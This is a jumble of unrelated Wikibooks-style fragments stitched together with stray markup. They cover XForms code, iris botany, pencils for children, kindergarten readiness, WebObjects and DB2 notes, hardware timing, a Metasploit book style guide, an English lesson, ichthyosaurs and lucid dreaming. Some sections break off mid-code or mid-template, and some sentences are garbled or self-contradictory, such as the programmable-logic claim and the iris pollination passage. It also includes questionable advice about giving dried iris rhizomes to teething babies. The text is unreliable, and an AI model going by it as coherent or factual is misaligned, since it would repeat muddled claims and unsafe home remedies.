This example uses the XForms &lt;code&gt;&lt;b&gt;switch&lt;/b&gt;&lt;/code&gt; and &lt;code&gt;&lt;b&gt;case&lt;/b&gt;&lt;/code&gt; statements to conditionally display a delete confirmation dialog.  This many not be the most elegant way of doing this.  Ideally a future version of XForms will add a confirm=&quot;yes&quot; option to the delete trigger.  But till then you can use the following example.

         &lt;/xf:switch&gt;
      &lt;/xf:group&gt;
   &lt;/body&gt;
&lt;/html&gt;
&lt;/source&gt;

== Discussion ==
We use the XForms switch and case statements to reveal the confirmation dialog.  The dialog also indicates what record is going to be deleted.

This example does not use CSS to have the dialog appear to display in a separate window above the form.  This can be done by wrapping the dialog in divs and styling the divs with CSS.

In the future our hope is that a the delete tag will have a confirmation option such as

&lt;code&gt;
&lt;xf:delete confirmation=&quot;true&quot; confirmation-message=&quot;XPath&quot;&gt;
&lt;/code&gt;

Where the message displayed would be a confirmation message.

'''''Iris''''' is a genus of between 200-300 species of flowering plants with showy flowers which takes its name from the Greek word for a rainbow, referring to the wide variety of flower colours found among the many species. As well as being the scientific name, iris is also very widely used as a common name and refers to all ''Iris'' species as well as some closely related genera.

The genus is widely distributed throughout the north temperate zone. Their habitats are considerably varied, ranging from cold regions into the grassy slopes, meadowlands, stream banks and deserts of Europe, the Middle East and northern Africa, Asia and across North America.

==Description==
They are perennial herbs, growing from creeping rhizomes (rhizomatous irises), or, in drier climates, from bulbs (bulbous irises). They have long, erect, flowering stems, which may be simple or branched, solid or hollow, and flattened or have a circular cross-section. The rhizomatous species usually have 3-10 basal, sword-shaped leaves growing in dense clumps. The bulbous species have cylindrical basal leaves.

[[Image:Iris pseudacorus 01.jpg|thumb|''Iris pseudacorus'']]
The leaves are simple, narrow, 2-ranked, and flat with parallel veins. The leaves are actually folded over and fused, so that only the underside of the leaf is exposed. Sword shaped or linear.

The inflorescences are borne on stiff, pithy scapes, are fan-shaped and contain one or more symmetrical, six-lobed, slightly fragrant flowers. These grow on a pedicel or lack a footstalk. The three sepals are spreading or droop downwards. They expand from their narrow base into a broader limb (= expanded portion), often adorned with lines or dots. The three, sometimes reduced, petals stand upright, partly behind the sepal bases. Some smaller iris species have all six lobes pointing straight outwards. The sepals and the petals differ from each other. They are united at their base into a floral tube, that lies above the ovary. The styles divide towards the apex into petaloid branches (see pollination, below).

Irises come with their own lingo that describes the various forms of the flowers, falling into one of three categories. They appear to have 9 tepals, but in fact have only 6 (the other three are the style arms). The upright tepals are called standards, while the pendant ones are called falls.

The iris flower is of special interest as an example of the relation between flowering plants and pollinating insects. The shape of the flower and the position of the pollen-receiving and stigmatic surfaces on the outer petals form a landing-stage for a flying insect, which in probing the perianth for nectar, will first come in contact of perianth, three with the stigmatic stamens in one whorl surface which is borne and an ovary formed of three carpels. The shelf-like transverse projection on the inner whorl under side of the stamens, which is beneath the over-arching style arm below the stigma, so that the insect comes in contact with its pollen-covered surface only after passing the stigma, while in backing out of the flower it will come in contact only with the non-receptive lower face of the stigma. Thus, an insect bearing pollen from one flower, will in entering a second, deposit the pollen on the stigma, while in backing out of a flower, the pollen which it bears will not be rubbed off on the stigma of the same flower.

The fruits are 3-celled capsules, 3 or 6 angled, opening on 3 valves, leathery, smooth, ribed, or bumpy, persisting often past the winter.

==Species==
Up to 300 species have been placed in the genus Iris. Modern classifications, starting with W. R. Dykes' 1913 book, have subdivided them. Dykes referred to the major subgroupings as sections, but later authors have generally called them subgenera, while essentially retaining his groupings. Like some older sources, the influential classification by G. I. Rodionenko removed some groups (particularly the bulbous irises) to separate genera, but even if this is done the genus remains large and several subgenera, sections and/or subsections are recognised within it.

For horticultural purposes, the Irises are divided into the bulbous and rhizomatous species, and the Iris flowers fall into one of three classifications:

“Bearded Iris” has a pattern of hairs (the beard) in a differently colored patch is showy on the basal half or the falls. 

“Unbearded Iris” has a differently colored patch (the signal) is showy on the basal half of the falls.

“Crested Iris” has a differently colored patch with a prominently raised hairy midrib (the crest) which is showy on the falls.

==Uses==
Primarily grown for their flowers, though some are also grown for their clean, upright foliage. Often grown for cut flowers as well.

Rhizomes of the bearded iris are the source of orris root and are used in perfume and medicine, though more common in ancient times than today. Today Iris essential oil (absolute) from flowers are sometimes used in Aromatherapy as sedative medicines. The dried rhizomes are also given whole to babies to help in teething.

For making perfumes, the rhizomes are harvested, dried, and aged for up to 5 years. In this time, the fats and oils inside the roots undergo degradation and oxidation, which produces many fragrant compounds that are invaluable in perfumery. The scent is said to be similar to violets. The aged rhizomes are steamed distilled which produces a thick oily compound, known in the perfume industry as iris butter.

==Maintenance==
[[Image:Iris rhizome p1150371.jpg|thumb|Rhizomes of ornamental irises]]
Rhizomatous irises need to be divided every few years, as the centers die out after a time, leaving only a &quot;ring&quot; of foliage and flowers around the edge of the dead center. Planting depth is important, as the rhizomes do not tolerate being buried.

Voles can cause serious damage, particularly during the winter, so monitor carefully during the winter months.

Iris foliage emerges very early, so the previous year's foliage should be cut back before thaw when possible.

==Propagation==
Division is the most common form of propagation.

      <text xml:space="preserve">==Who Invented It?==
The most primitive type of pencil is believed to be the stylus, which was a thin metal stick, often made from lead and used for scratching in a layer of wax contained in a wooden frame in Roman Usage or scratching on  papyrus, a form of early paper. They were used extensively by the [[Wikijunior:Ancient Civilizations/Egyptians|ancient Egypt]]ians and [[Wikijunior:Ancient Civilizations/Romans|Romans]]. The word ''pencil'' comes from the Latin word {{lang|la|''pencillus''}} which means &quot;little tail&quot;.

==What is it made of?==

[[File:Pencils hb.jpg|thumb|HB graphite pencils.]]

All pencils have these two parts:
*Barrel: The barrel is usually made of wood and occasionally made of clay, recycled paper, or recycled plastic.  It is the largest, heaviest part of the pencil and provides a surface to hold.

*Lead: The &quot;lead&quot; is so named because when pencils were first invented, this part was made of elemental lead.  Now this part is made of graphite, a form of elemental carbon where the carbon atoms are arranged in thin sheets.  Friction between the graphite and paper-like surface causes tiny flakes of graphite to come off and become attached to the surface.  To prevent smearing, the graphite is mixed with a small amount of clay to harden it and make it easier to work with.
Some pencils have an extra accessory:
*Eraser: The eraser allows the user of the pencil to manually and mechanically &lt;b&gt;delete&lt;/b&gt;, by rubbing away, the unwanted marks from a surface. The eraser is attached to the barrel with a metal collar, called a ferrule. This device was first introduced by Hymen Lipman on March 30, 1858, receiving the first patent for attaching an eraser to the end of a pencil. Lipman sold his patent in 1862 to Joseph Reckendorfer for $100,000, who went to sue the pencil manufacturer Faber for infringement. In 1875 the Supreme Court of the United States ruled against Reckendorfer, declaring the patent invalid.

==Types==
Some types of pencils are:
* Graphite pencils: These are the most commonly found pencils. They are made up of a mixture of clay and graphite.
* Mechanical pencils: These pencils push the lead through a small opening using mechanical methods. They are popular because they do not need to be sharpened and the lead is replaceable.
* Pop-a-point pencils: This type of pencil is also known as non-sharpening pencils. In this type many sharp points are placed in the body of the pencil. When one point becomes blunt, it is removed and inserted at the top of the body. This causes the next sharp point to appear from the writing end of the body.  

==How is it used?==
Pencils can be used for a variety of purposes, some productive, others not. The obvious use is to write letters to intimate friends, or teachers and principles. The graphite, however, usually makes the paper rather messy as it is folded, and this is not always the most exciting method of intimacy. Another use for a pencil is the popular game of &lt;tt&gt;slap&lt;/tt&gt;, a game that middle school children reportedly still play today. The object of the game is to take turns slapping an opponents pencil with the tip of one's own pencil in succession. The first pencil to break loses.

Pencils sometimes fall into the role of a chew-toy, most humans when nervous or absent in their thoughts, will bite a pencil (or similar object, failing to have one the nails are also a common choice), in this way most people can easily identify and personalize their pencils, this can also be considered as imparting a type of protection to the object, since any other person would probably object using that pencil in the future (it is of importance to note that a complete destruction of the object as a result of this action is rarely seen, and due to the hardness of the wooden barrel, quite difficult).

Thus, the pencil was a good friend to many people when it came out. Sadly, as newer methods of writing have emerged, the pencil has been relegated to lesser status and uses. People now write messages on computer screens, never having to come close to a sharpener. One can only wonder what the keyboard will become when something newer comes along.

==How Dangerous is it?==
The graphite used in pencils was originally thought to be lead. The term lead is still used to refer to the core of pencils even though that isn't actually what it is.
The &quot;lead&quot; in pencils is actually graphite and it is not dangerous if accidentally ingested.But if it happens to puncture you or cut you, wash your wound with peroxide to kill the germs.

 (the text below was left as an editors' note on wikipedia)

--(for transfer to species accounts when pages for them are started:)

*''Iris albicans'', known as the white flag iris or the cemetery iris, has been cultivated since ancient times and may be the oldest iris in cultivation. Collected by [[Johan Martin Christian Lange|Lange]] in [[1860]], it has been in cultivation since at least [[1400 BC]]. Originating from [[Yemen]] and [[Saudi Arabia]], it appears in a wall painting of the [[Botantical Garden]] of [[Tuthmosis III]] in the [[Temple of Amun]] at [[Karnak]] in ancient [[Thebes (Egypt)|Thebes]] dated around [[1426 BC]]. It grows to 30-60 cm tall and is fragrant.
*''Iris foetidissima'', the Foetid Iris, the Xyris or stinking gladdon of Gerard, is a native of [[England]] south of [[Durham]] and also of [[Ireland]], southern [[Europe]] and [[North Africa]]. Its flowers are usually of a dull, leaden-blue colour; the capsules, which remain attached to the plant throughout the winter, are 5-8 cm long; and the seeds scarlet. When bruised this species emits a peculiar and disagreeable odour.
*''Iris orienii'' Orjen iris, a close relative to ''Iris pallida''. An endemic alpine species with white flowers found in the karst mountain Orjen in Montenegro. It is very rare and protected. 
*''Iris pallida'' Dalmatian iris, Sweet iris; native to the Illyrian coast (former Yugoslavia) but widely naturalised elsewhere. ''Iris pallida'' is cultivated for extraction of essential oils from its rhizome [[orris root]]. Prefers rocky places in the mediterranean and submediterranean zone and reaches sometimes montane regions at its southern range in Montenegro. Four varieties (regularly described as separate species) are recognised with one possible new alpine species having white flowers. The variety with deep purplish flowers from Northern Italy and the Slovenian alps is called ''Iris cengialti''.  
*''Iris reichenbachii'' Reichenbach iris is a small bearded alpine iris from the Balkan peninsula. Specimens from the west Balkans are much smaller than those from Greece and the eastern Balkans.
*''Iris reticulata'' and ''Iris persica'', both of which are fragrant, are also popular with florists.
*''[[Iris versicolor]]'', or Blue Flag, is indigenous to [[North America]], and yields &quot;iridin&quot;, a powerful [[liver|hepatic]] stimulant. 
*''[[Iris xiphium]]'', the Spanish Iris (also known as Dutch Iris) and
*''Iris xiphioides'', the English Iris.  Despite the common name of  ''I xiphioides'', both are of Spanish origin, and have very showy flowers, so they are popular with gardeners and florists.  They are among the hardier bulbous irises, and can be grown in northern Europe.  They require to be planted in thoroughly drained beds in very light open soil, moderately enriched, and should have a rather sheltered position. Both these present a long series of beautiful varieties of the most diverse colours, flowering in May, June and July, the smaller Spanish iris being the earlier of the two.  --


==Cultivation (from wp: mostly about individual species)==
Irises are extensively grown as ornamental plants in gardens. The most commonly found garden iris is the bearded German Iris and its numerous cultivars. Various wild forms and naturally occurring hybrids of ''Iris pallida'' and ''I. variegata'' form the basis of most all modern hybrid bearded iris.  Median forms of bearded iris [intermediate bearded (IB), miniature tall bearded (MTB), etc] are derived from crosses between tall and dwarf varieties.  Other iris types commonly found in garden are ''I. siberica'' and its hybrids (Siberian irises) and ''I. ensata'' and its hybrids (Japanese irises).

The bearded irises are easy to cultivate and propagate, and have become very popular in gardens. They grow in any good free garden soil, the smaller and more delicate species needing only the aid of turf ingredients, either peat or loam, to keep it light and open in texture. The earliest to bloom are the dwarf forms of ''Iris pumila'', which blossom during March, April and May; and during the latter month and the following one most of the larger growing 'tall bearded' varieties, such as ''I. germanica, florentina, pallida, variegata, amoena, flavescens, sambucina, neglecta, ruthenica'' and their modern hybrids. 

It should be noted that a true red standard, tall bearded Iris remains an unattained goal of frequent hybridizing and selection. There are species and selections thereof, most notably, Iris fulva, which has a relatively pure red color. However, getting this color into a modern Iris breed has proven very difficult, and thus, the vast majority of Irises are in the purple\blue range of the color spectrum.

The section ''Iris'' subgen. ''Iris'' sect. ''Oncocyclus'' contains the cushion or royal irises, a group of plants noted for their large, strongly marked flowers. Between 30 and 60 species are classified in this section, depending on the authority. Compared with other irises the cushion varieties are scantily furnished with narrow sickle shaped leaves and the flowers are usually borne singly on the stalks. The closely allied ''Iris'' subgenus ''Iris'' sect. ''Regelia'', includes several garden hybrids with species in sect. ''Oncocyclus'', known as &quot;''Regelio-cyclus''&quot; irises. They are best planted in September or October in warm sunny positions, the rhizomes being lifted the following July after the leaves have withered.

''Iris unguicularis'' (syn. ''I. stylosa'') is a late winter flowering species from Algeria, with sky-blue flowers blotched with yellow, produced (in the Northern Hemisphere) from November to March or April.

Many other smaller species of bulbous iris, being liable to perish from excess of moisture, should have a well-drained bed of good but porous soil made up for them, in some sunny spot, and in winter should be protected by a covering of half-decayed leaves or fresh coco-fibre refuse. To this set belong  ''I. milifolia'', ''I. junonia'', ''I. danfordiae'', ''I. reichenbachii'' and others which flower as early as February and March.

The cushion irises are somewhat fastidious growers, and to be successful with them they must be planted rather shallow in very gritty well-drained soil. They should not be disturbed in the autumn, and after the leaves have withered the roots should be protected from heavy rains until growth starts again naturally.</text>

==Introduction:==




The history of kindergarten  is important because it became the first large-scale early childhood 
program (Harris, K., &amp; Knudsen-Lindauer, S. L. 1988 pp. 61-73).The importance of the kindergarten readiness stems from the need to better prepare our children and to understand what is expected from our children as we send them to school maybe for the first time.A child will admitted into the program at various times due to birthday regulations that vary from state to state these deadlines schools use to determine who can enter the next kindergarten class. Your child must reach the age of 5 by the cutoff date. Starting school is an important time for young children, their families, and educators. Kindergarten is a time for children to expand their love of learning, their general knowledge, their ability to get along with others, and their interest in reaching out to the world. (Harris,K., &amp; Knudsen-Lindauer, S. L. 1988 p.p 61-73) The fifth birthday is approaching and that brings the first of formal education to a child’s life. It is important to help prepare a child for kindergarten and the road ahead.


What to expect:

In kindergarten, a child will develop skills in many areas . However, kindergarten makes up only a small part of each day. The key to a successful school year is a strong partnership between home and school. The following are ideas that are used in many schools to help a child to prepare for the up and coming kindergarten year. The exposure to various important skills will be helpful such as: Counting out loud to 10 ,recognizing numbers 0-10 ,recognizing capital and lowercase letters of the alphabet , recognizing and drawing the four basic shapes (square, circle, rectangle, triangle),recognizing and writing his/her first name,buttoning and zipping clothing, tying shoelaces, coloring and cutting, listening and following directions,sharing and taking turns these will help a future student to become successful and help the kindergartner to improve their educational outcome. There are many studies that look at the interaction of teachers, parents and the community and how they contribute as critical roles in the early education of children (Journal of Early Childhood Research, Vol. 4, No. 3, 223-258, 2006). Children need to be made to feel good about who they
are and that learning can be fun. Developing a love for learning and knowledge is an important life-long tool for every child.

==When A Child Enters==
When a child enters Kindergarten with confidence they will share their knowledge and speak more 
comfortably. But if children aren't ready, beginning school can be confusing and embarrassing, even frightening.The best way to help support a child in the route to kindergarten would be to attend the kindergarten orientation visit the school, arrange a tour of the school bus, involve your child in shopping for supplies and let him organize his backpack, and practice self-help skills. It is important to work with your child and the teachers as a team, the new world of school can be an exciting adventure and positive experience.
It important that it is known that young children learn differently than older children, their schooling must be different. Thus, their teachers require special training to insure growth and development. It has been noted that kindergarten is &quot;one of the major challenges children have to face in their early childhood years&quot; (Victorian Department of School Education, 1992, p. 44) Parents and early childhood educators, on the other
hand, have emphasized the importance of children adjusting socially to the school environment. It is important that children are playing and working with materials or other children. According to NAEYC, the following are good signs of a properly ran kindergarten classroom: Here are ten listed signs of a good kindergarten classroom:

1. Children have access to various activities throughout the day, such as block building, pretend play, picture

books, paints and other art materials, and table toys such as LEGO, pegboards, and puzzles.

2. Teachers work with individual children, small groups, and the whole group at different times during the day.

3. The classroom is decorated with children’s original artwork, their own writing with invented spelling, and dictated stories.

4. Children learn numbers and the alphabet in the context of their everyday experiences.

5. Children work on projects and have long periods of time (at least one hour) to play and explore.

6. Children have an opportunity to play outside every day that weather permits. This play is never sacrificed for more instructional time.

7. Teachers read books to children throughout the day, not just at group story time.

8. Curriculum is adapted for those who are ahead as well as those who need additional help. Because children

differ in experiences and background, they do not learn the same things at the same time in the same way.

9. Children and their parents look forward to school. Parents feel safe sending their child to kindergarten. 
Children are happy; they are not crying or regularly sick.

10. Individual kindergarten classrooms will vary, and curriculum will vary according to the interests and

backgrounds of the children. But all developmentally appropriate kindergarten classrooms will have one thing in

common: the focus will be on the development of the child as a whole.

(1990. Washington, DC: NAEYC) NAEYC is an organization that works toward positively building early childhood education by offering training and programs to schools and individuals. They offer studies that are based upon actual research which help further development in young children.

==Sum it up: What Kindergarten should be.........==

The whole experience of kindergarten is for five year olds. It is geared toward the five year old
child.It is custom-made to fit children of this particular age. So remember that preparing for kindergarten takes the parent, the child and the community. So be prepared.

==Multiple Choice:==

2. What is the worst way to pick a kindergarten program? 

a. word of mouth 
b. just take what you get
c. looking and talking with the teachers
d. i don't know what I should do

3. How can parents/caregivers prepare their children for Kindergarten?

a. Parents/ caregivers should model a positive attitude towards school 
b. ignore the child 
c. offer advice to the child.
d. none of the above

==Essay :==

==What is &quot;readiness,&quot; but what does it really mean? How does a parent know if there child is &quot;ready?&quot; How does anyone know?==


Being &quot;ready&quot; for Kindergarten means, merely that your child is able to learn what will be taught in the Kindergarten he or she will attend, and can do the expected tasks comfortably with teachers and other children in that setting. Since learning builds on learning, this means that a child needs to have acquired the skills,information, and attitudes that are necessary to do this, and have the ability to get along with others and be
part of a group. When many parents think about Kindergarten readiness, they sometimes wonder and think too much on academics, but the skills that define readiness are far broader than knowing letters, numbers, and how to count. To be ready for Kindergarten, a child should have a positive attitude toward starting school, some understanding of why he or she is there, and be open to learning new and exciting things and making new friends. The best way to learn what will be expected of your child is to contact the school your child will
attend, schedule a tour and speak to the teachers that will possible be your child’s teacher. As far as wondering if anyone knows you as a parent should prepare your child by offering yourself as a great role model.


I hope that you enjoyed my thoughts about kindergarten readiness...................

      <text xml:space="preserve">= IBM DB2 and XForms =
IBM DB2 version 9 (also known as the &quot;PureXML&quot; release) supports both the XQuery language as well as an XML datatype. This makes it an ideal candidate for storing and retreiving your XForms instance data.

Unfortunately as of March of 2007 there is no pre-written REST interface to DB2 or a web-based administration tool for setting up and configuring DB2 XML collections..  To save your form data you will have to write some Java middleware to take the data in an HTTP POST and save it to a table in DB2 that has an XML datatype.

Here is an example from the IBM DeveloperWorks web on how to use Java to send XML data to DB2:

[http://www-128.ibm.com/developerworks/db2/library/techarticle/dm-0610kokkat/ IBM DB2 XML Article]

The good news is that once the data has been saved into DB2 you can query it using standard XQuery tools.

      <text xml:space="preserve">The WO (EOF, actually) way of handling rows (objects) can be confusing if you are using to thinking in SQL. The general outline of using WO for database rows is:


== FETCHING AN INITIAL SET OF OBJECTS ==

To fetch objects from your persistence layer (retrieve records from the database which will be converted to EnterpriseObjects on the fly), do the following:

- create your EOModel or obtain one that fits

- declare the NSArray in which you want store the Enterprise Objects that your table's rows will be turned into

- establish your editing context, &quot;ec&quot; (for simple cases, just use WOSession.defaultEditingContext, otherwise, be sure to lock/unlock).

- create an EOQualifier (if you want to filter the objects coming from a given table)

- create a set of EOSortOrderings (if you want your records presorted when they are retrieved)

- create an EOFetchSpecification, fs, to tie the fetch together

- execute ec.objectsWithFetchSpecification(fs);


== OBTAINING RELATED OBJECTS ==

To obtain any object that is related (has an EORelationship) to any of the EnterpriseObjects that you've already fetched, just refer to them as you would to any object referenced by another POJO (Plain Old Java Object). The reference will be enough to cause WO to &quot;fire a fault&quot; which causes the referenced objects to be retrieved for you automatically.


== UPDATING OBJECTS ==

If you've done enough to fetch objects from your database, then to update records, just update the appropriate fields (best to use the get/set methods) of the object and do:

  ec.saveChanges();


== CREATING NEW OBJECTS ==

Although there are a few ways to do this, the safest and probably most efficient is to use:

  EOUtilities.createAndInsertInstance(ec, &quot;myNewEntitiesName&quot;);
  ec.saveChanges();


== DELETING OBJECTS ==

In order to delete an object, first you must explicitly delete it from the ec then save the changes:

  ec.deleteObject(myObject);
  ec.saveChanges();


== RELATING OBJECTS ==

If you have two EnterpriseObject classes that have an EORelationship, such as a one to many relationshiop for instance as follows:

  A &lt;--&gt;&gt; B

or

   objectA
      className
      myBs  ( --&gt;&gt;B )

  objectB
     name
     myA  ( --&gt;A )


then to create two such objects and relate them to one another, you would:

    myA = (A)EOUtilities.createAndInsertInstance(ec, &quot;A&quot;);
    myB = (B)EOUtilities.createAndInsertInstance(ec, &quot;B&quot;);
    myA.addObjectToBothSidesOfRelationshipWithKey(b, &quot;myBs&quot;);
    //  set other attributes of both myA and myB here.
    ec.saveChanges();

You could also, of course, have used:

    myB.addObjectToBothSidesOfRelationshipWithKey(a, &quot;myA&quot;);

The important thing to remember is that the addObjectToBothSidesOfRelationshipWithKey method need only be used once on one of the objects to establish the relationship in both directions whether either or both of the relationships is a toOne or a toMany and whether the relationship is bidirectional or not. It's a VERY HELPFUL method.

Also see removeObjectFromBothSidesOfRelationshipWithKey for it's deleting counterpart.



== NOTES ON THE EDITING CONTEXT ==

In general, remember that the purpose of an editing context is to provide a runtime context for your program in which each EnterpriseObject is unique (within the editing context) and in which you can create, add, update and delete objects made known to that editing context. However, in general, nothing you do within your editing context is reflected in the database until you do ec.saveChanges(). Then, all the changes you've made since the last saveChanges() will be committed to the database.

There are esoteric exceptions to the above, but that's the best way to remember it.


There are, of course, many other things to know about WebObjects, but knowing the above should help you a lot and at least provide you with hooks to look up many of the ideas in the API reference.


== A Warning ==
If you're new to WO, be sure to read over the [[../EOF/Using EOF/The EOF Commandments|EOF Commandments]] to avoid some pernicious problems.

If any of the commandments aren't obvious to you, ask someone.

      <text xml:space="preserve">{{Programmable Logic Page}}

In microprocessor-based software systems, instructions are performed sequentially. Each instruction is allowed to complete before the following instruction may begin. Even in situations where this is not strictly the case, such as pipelined and superscalar processors, the changes to this pattern are transparent to the programmer and can essentially be ignored.

In programmable logic, however, this is the case. Instructions can neither be expected to occur in a particular timeframe, nor in a particular order. Verilog and VHDL both contain constructs to force certain synchonization, although these constructs may carry with them a performance penalty.

Typically, a hardware design should have a clock signal that all the various modules have access to. Actions that occur in response to the clock signal are known as '''synchronous''', and actions that occur without the clock signal are known as '''asynchronous'''. Furthermore, through the use of clock multipliers, different modules in a design can be moving at different speeds. Needless to say, timing and synchronization can be very important problems to solve for a hardware designer.</text>

The encapsulation example is well meant, certainly, but it's just not very common or useful. I don't think this is common in ''any'' language without strict, technically enforced private variables (Python, Javascript); it's just suggested by outside parties as a way to get something more like C++ or Java.</text>

Hi there - I appreciate that this may be a shared IP address, or it might have changed hands since the event mentioned - but please be aware that your question placed at the bottom of [[Programming:Visual_Basic_Classic/Arrays]] has been removed by me, since Wikibooks is a site for providing information, not asking questions. Feel free to ask questions on some [http://www.google.co.uk/search?q=visual+basic+forums Visual Basic Forums], or maybe even on the [[Talk:Programming:Visual_Basic_Classic/Arrays]] page (the discussion page, as has been done previously by another user). However, please do not ask questions in articles again.

Thanks, [[User:Carl Turner|Carl Turner]] 20:58, 19 March 2007 (UTC)

      <text xml:space="preserve">== Motivation ==

== Sample Program ==

= Preventing Form Data Loss When User Navigate Away from Unsaved Data =

Add this code to global.js
&lt;source lang=&quot;xml&quot;&gt;
&lt;script type=&quot;text/javascript&quot;&gt;
        // adding a gmail style function to stop the user from moving away from the page..
        function unloadMessage(){message = &quot;This form has not yet been submitted to the database\nAll data will be lost.&quot;
         return message;}
        function setBunload(on){window.onbeforeunload = (on) ? unloadMessage : null;}
        setBunload(true);
&lt;/script&gt;
&lt;/source&gt;

Mozilla Page [https://bugzilla.mozilla.org/show_bug.cgi?id=68215]

IE Manual [http://msdn.microsoft.com/workshop/author/dhtml/reference/events/onbeforeunload.asp]

&lt;/pre&gt;

== Discussion ==

Use the xf:load action in combination with an xforms-value-changed event to call a &quot;dirty&quot; function containing setBunload(true).

Likewise, use the load action within the submission to call a &quot;clean&quot; function containing &quot;setBunload(false)&quot;.

&lt;source lang=&quot;xml&quot;&gt;
function dirty() {
    setBunload(true);
}
function clean() {
    setBunload(false);
}
This one goes in your &quot;submission&quot; element:
&lt;xf:load resource=&quot;javascript:clean()&quot; ev:event=&quot;xforms-submit-done&quot;/&gt;

and this 
&lt;xf:load resource=&quot;javascript:dirty()&quot; ev:event=&quot;xforms-value-changed&quot;/&gt;
goes somewhere in the form  - place it at the body-level to capture all change events, or nest it within a more appropriate container.
&lt;/source&gt;

== References ==
This example was taken from Alex Bleasdale in 2007.

      <text xml:space="preserve">=== The Metasploit Book Writing Guide ===


When using screen shots please keep them &quot;clean&quot; and non-promotional. Tech writers tend to insert screen shots of their company's web site or their research groups banner. Try to keep all screen shots boring and generic for the sake of consistency. 


When using screen shots try to use light backgrounds with dark text for all screen shots. It's not quite as leet looking but it uses much less ink if someone decides to print out the content.


When using any graphics keep in mind that light colors will not print well. Avoid using yellow on a white background and try not to color-code screen elements when a description or other icon will suffice. If you talk about how the green button does one thing and the rest does another the reader will be very confused when they print in black and white. Some readers are color blind and would not understand these references either.


A screen shot is not a replacement for a thorough explanation but there is no need to describe every element of a screen shot.


Write as if you are working with the reader in real-life. Use &quot;we&quot; to represent yourself and the reader. For example &quot;Now that the  buffer has been created we can use this method to insert our return address&quot;. Do not use &quot;we&quot; to represent yourself and the co-authors.


Always use present tense and active voice. For example write &quot;Use the ENCODER option to specify a particular payload encoder&quot; do not write &quot;The ENCODER option is used to specify a particular payload encoder&quot;


Avoid slang and curse-words. Some users aren't as cool as you and may not understand. Worse they may be offended.


Avoid long words and sentences. If you are using more than 3 commas in a sentence think about a shorter way to represent the same idea. Try to keep paragraphs short. Over two sentences but no more than half a page long each.

'''Aim of this lesson:''' Practice some common questions and their replies and familiarise yourself with common adjectives and their dependent prepositions.
{{audio|B2_unit1.ogg|listen|help=no}}
{| {{English/B2/Table|Speaking|Common Questions||2}}
! Question
! Example answer
|-
| Where are you from?
| I am from Ireland.
|-
| What languages do you speak?
| I speak English.
|-
| What languages do you want to learn?
| I want to learn Greek because I am interested in ancient history.
|-
| What languages did you study at school?
| I studied French and Spanish at school.
|-
| What countries have you visited?
| I have visited France, Italy and Poland.
|}

== Grammar Focus - Answering Questions ==

''It is often difficult in English to know which tense to use when having a conversation with somebody.  We often don't have time to think about the uses of each tense and then make a decision.  Look again at the questions at the start of this unit.  What tenses are the questions in?  Now look at the answers given - what tenses are they in?

=== Responding to questions ===

* Where are you from? ''Present Simple''
* I am from Ireland. ''Present Simple''
* What countries have you visited? ''Present Perfect''
* What languages did you study at school? &quot;Past Tense&quot;
* I have visited France, Italy and Poland. ''Present Perfect''

When speaking with someone it is important to listen to the question as this will help you phrase your answer.  We generally use the same tense in our reply as in the question.

== Vocabulary Focus - Adjectives with Prepositions ==
[[Image:Wayne Rooney 2.jpg|thumb|250px|right|Wayne Rooney, Manchester United FC, England]]
* I am interested in ancient history
''Is it possible to say 'I am interested at...?' or 'I am interested on...?

Many adjectives are used with specific prepositions.  It is important to learn many of the most common '''adjective + preposition''' pairs as this will make you sound much more natural.

=== Adjectives + Prepositions ===

{| {{English/B2/Table|Vocabulary|Adjectives &amp; Prepositions||2}}
! Form
! Example
|-
| interested + in
| I am interested in history
|-
| good + at
| I am good at football
|-
| keen + on
| I am very keen on rock music
|-
| worry + about
| I am worried about my cat
|-
| scared + of
| I am scared of spiders
|}

== Speaking about yourself ==
''Now that you've studied the grammar and vocabulary above you should practice answering these questions.  Remember to listen to (or read) the questions carefully as this will help you phrase your answer.''

* What are you interested in? I'm interested in modern history.
* What language do you want to learn? I want to learn English.
* What do you worry about? I worry about working.
* What are you scared of? I'm very scared of spiders.
* What do you want to eat? I want a pizza.

== Exercises ==

Try these questions to see if you can answer these questions and use adjectives correctly.  

''Complete the following sentences using the correct preposition:''

# My sister's afraid ..... spiders and I'm scared ..... dogs.

{{droplist|hbgc=papayawhip|cff=Arial|width=300px|align=center|cfc=maroon|cbgc=lightyellow|hff=Verdana

      <text xml:space="preserve">[[Image:Ichthyosaurus h harder.jpg|250px|thumb|A painting of Ichthyosaurus.]]
Ichthyosaurs were not actually dinosaurs. They were more like ancient dolphins, or fish, but much bigger. Their name comes from Greek, and means 'fish lizard.'

==What did they look like?==
Ichthyosaurs looked like dolphins do today.  They had a long nose, a fin on top, and all of the other things that would make you think of dolphins.  The only two major differences were that Icthyosaurs had an extra set of tiny fins that it used in times of need and that the tail fin of an Ichthyosaur was rotated from that of a modern dolphin.  Their size range was great, from 2.4 meters (eight feet) to 23 meters (75 feet).  They biggest Ichthyosaurs are still the largest known sea-dwelling reptiles today!

==What did they eat?==
{{WJ Dinosaurs}}
Ichthyosaurs were predatory.  They lived in the sea, so they ate any food they could find, catch, and kill, including squid, fish, and shellfish.  They were very good at catching food.  They had streamlined bodies capable of swimming up to 40 miles an hour.  They also were able to dive far into the water.  Finally, their dolphin-like mouths were filled with sharp teeth, and some Ichthyosaurs may have been able to bite down hard enough to break open clams.

==When did they live?==
Ichthyosaurs evolved during the Mesozoic era, which was around 250 million years ago, slightly before the dinosaurs.  They became extinct 90 million years ago, which was during the Cretaceous 25 million years before dinosaurs died out.

==Disclaimer==

When attempting some of the techniques in this book, you may have some frightening experiences, such as falling sensations or [[w:sleep paralysis|sleep paralysis]]. Although the authors attest these are not dangerous, you should avoid techniques that create these sensations if you would prefer not to experience them.

Your own expectations will have a significant effect on your dreams. If you believe that dream characters act dull and lifelessly, they are far more likely to do so. If you believe they can be creative, original, and surprising, they are far more likely to be. Remember that the easier you think it is to dream lucidly, the easier it will be.

Many of the techniques and “facts” presented on these pages are not backed up by scientific research. This is not to say that these techniques do not work, only that they may be [[w:Placebo effect|placebos]] or be ineffective much of the time.

==About dreaming==

&lt;div style=&quot;float: right; margin: 0 0 1em 1em; font-style: oblique; font-size: smaller;&quot;&gt;[[Image:Sleep_Cycle.svg||Stages of sleep]]&lt;br /&gt;The stages of sleep&lt;/div&gt;

Each night, we spend about one and a half to two hours dreaming. We dream about once every 90 minutes of sleep. The time you spend in dreams becomes longer throughout the night, from about 10 minutes to around 45 minutes or slightly longer. But what happens when we sleep?

